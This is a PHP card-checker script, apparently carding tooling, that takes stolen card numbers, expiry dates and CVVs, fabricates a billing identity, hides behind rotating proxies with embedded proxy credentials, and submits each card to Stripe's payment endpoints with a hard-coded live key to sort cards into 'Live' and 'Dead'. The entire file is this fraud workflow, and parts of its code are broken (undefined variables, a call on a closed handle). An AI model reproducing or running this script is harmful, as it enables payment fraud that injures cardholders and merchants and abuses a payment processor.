<?php

error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];



function getStr2($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/

//Init proxy

$Websharegay = rand(0,250);
$rp1 = array(

1 =>'muhnjtqq-rotate:rrscreyr23h5',
2 =>'cpechidt-rotate:7mwiomksg0py',
  );
$rotate = $rp1[array_rand($rp1)];

//proxy sec

$ch = curl_init ('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'https://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
  $ip1 = "Proxy Live ";
}
if (empty ($ip1)){
  $ip = "DEAD![".$rotate."]";
}
echo '[IP: '.$ip.']';

//first req.
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'referer: https://checkout.stripe.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$name.'+'.$last.'&billing_details[email]=andrewsanchez0666%40gmail.com&billing_details[address][country]=PH&guid=efd68a50-e10c-4291-bbc6-89274257050a9a00f6&muid=5741a3a8-9bd7-49b6-9e56-07163d1230e97f850d&sid=858c6a32-a32a-4c94-8c06-93c3055d36d37cf153&key=pk_live_51IRxUcDLIzmrTQnhsmMVLFrGLJiLZffMnk2aWZbHjR4JT2gzsJtDoufWCSkjPC9kyr7q9tZYM7cwVwqh8eGIOxpz00cN5v5Z1c&payment_user_agent=stripe.js%2F38f1385fa%3B+stripe-js-v3%2F38f1385fa%3B+checkout');
$result1 = curl_exec($ch);
$token = trim(strip_tags(getstr($result1,'id": "','"')));
curl_close($ch);
//echo "<b> Result 1: </b>$result1<hr>";

//result 2

                  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/cs_live_a1b5POdwVQVgTLzsHnxeg5dJhpl4pCWmhwQwjPwjATliZkVxJ56XMkEkXx/confirm');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'referer: https://checkout.stripe.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$token.'&expected_amount=100&expected_payment_method_type=card&key=pk_live_51IRxUcDLIzmrTQnhsmMVLFrGLJiLZffMnk2aWZbHjR4JT2gzsJtDoufWCSkjPC9kyr7q9tZYM7cwVwqh8eGIOxpz00cN5v5Z1c');
$result = curl_exec($ch);
curl_close($ch);
//echo "<b> Result 2: </b>$result<hr>";

$a = curl_exec($ch);
$message = trim(strip_tags(getstr(a,'"message":"','"')));
if (strpos($a, "Your card's security code is incorrect.")) {
 echo '<span class="badge badge-success">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b style="color: white;"> ❤Live❤ '.$bin.'('.$banco.'-'.$nivel.')<br>';
  }
else if(substr_count($c, 'incorrect_number') > 0){
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b> ❌ Invalid ❌ </b>';
  exit();
  }
  
else if (strpos($c, "Your card's security code is incorrect.")) {
 echo '<span class="badge badge-success">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b style="color: white;"> ❤Live❤ '.$bin.'('.$banco.'-'.$nivel.') <br>';
  }





else if (strpos($c, "Your card does not support this type of purchase.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Blocked 🔴'.$bin.'() /b>';
}


else if (strpos($a, "Your card was declined.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Dead 🔴'.$bin.'()  </b>';
}


else if (strpos($a, "Your card number is incorrect.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b> ❌ Invalid ❌  </b>';
}

else if (strpos($a, "Your card does not support this type of purchase.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Blocked 🔴'.$bin.'() </b>';
}
else if (strpos($c, "Your card was declined.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Dead 🔴'.$bin.'() </b>';
}
else {
 echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Unknown 🔴 '.$bin.'() </b>';
}


?>